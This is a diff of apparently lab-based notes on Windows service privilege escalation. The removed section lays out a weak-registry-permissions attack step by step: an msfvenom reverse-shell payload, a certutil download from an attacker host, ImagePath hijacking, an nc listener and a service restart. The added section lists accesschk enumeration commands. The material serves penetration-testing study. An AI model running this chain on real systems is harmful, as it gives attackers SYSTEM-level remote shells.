@@ -275,109 +275,35 @@ net start unquotedsvc
 
 ___
 
-#  03: Service Exploits - Weak Registry Permissions
-
-Windows Registry = Database that stores system settings
-
-Service settings stored in:
-
+## 03: Service Exploits - Insecure Service Executables
+If you can replace or modify the actual service executable file, you can run your code as SYSTEM!
 ```
-HKLM\System\CurrentControlSet\Services\<ServiceName>
-```
-
-**The Problem:**
-If you can modify the registry key for a service, you can change what executable it runs!
-
-## Understanding the Registry
-### Registry Structure for Services
-```
-HKLM\System\CurrentControlSet\Services\
-├── ServiceName
-│   ├── ImagePath          ← Path to executable (TARGET!)
-│   ├── ObjectName         ← Account it runs as
-│   ├── Start              ← Startup type
-│   └── Type               ← Service type
+Service runs: C:\Program Files\Service\service.exe
+                              ↓
+         Can you REPLACE this file?
+                              ↓
+                    Replace with YOUR shell!
+                              ↓
+                  Service runs YOUR code as SYSTEM! 🚨
 ```
 
-**Key Values:**
+### Windows File Permissions (ACLs)
+```
+Everyone     (F)  ← Full Control (READ + WRITE + EXECUTE + DELETE) 🚨
+Everyone     (M)  ← Modify (READ + WRITE + EXECUTE) 🚨
+Everyone     (W)  ← Write 🚨
+Everyone     (R)  ← Read only ✅ Safe
+```
 
-**ImagePath:** What program runs when service starts
-**ObjectName:** Which user account runs it (LocalSystem = SYSTEM)
+Vulnerable = You can WRITE/MODIFY the service .exe file
 
-
-## Finding Vulnerable Registry Keys
+### Finding Vulnerable Service Executables
 #### Method 1: Using AccessChk
 ```
-# Check registry permissions for all users
-accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services
+# Check file permissions for all users on all services
+FOR /F "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @accesschk.exe /accepteula -quvw "%a"
 
-# Check specific service
-accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
-```
-
-**Look for:**
-```
-KEY_ALL_ACCESS          ← Full control! 🚨
-KEY_WRITE               ← Can modify! 🚨
+# Check specific service executable
+accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
 ```
 
-#### Method 2: PowerUp
-```
-. .\PowerUp.ps1
-Get-ModifiableServiceRegistry
-```
-
-## Example:
-###  Found "regsvc" with weak registry permissions
-#### Step 1: Verify vulnerability
-```
-# Check current service settings
-sc qc regsvc
-
-# Check registry permissions
-accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
-```
-
-**Output:**
-```
-RW NT AUTHORITY\INTERACTIVE    ← Logged-in users can WRITE! 🚨
-```
-
-
-#### Step 2: Check current ImagePath
-```
-reg query HKLM\System\CurrentControlSet\Services\regsvc /v ImagePath
-```
-
-**Output:**
-```
-ImagePath    REG_EXPAND_SZ    C:\Program Files\Vuln Service\service.exe
-```
-
-#### Step 3: Create malicious payload
-```
-# On Kali
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o shell.exe
-```
-
-#### Step 4: Upload payload
-```
-certutil -urlcache -f http://10.10.10.5/shell.exe C:\Temp\shell.exe
-```
-
-#### Step 5: Modify ImagePath in registry
-```
-# Change registry to point to your shell
-reg add HKLM\System\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d "C:\Temp\shell.exe" /f
-```
-
-#### Step 6: Start listener
-```
-nc -lvnp 4444
-```
-
-#### Step 7: Restart service
-```
-net stop regsvc
-net start regsvc
-```
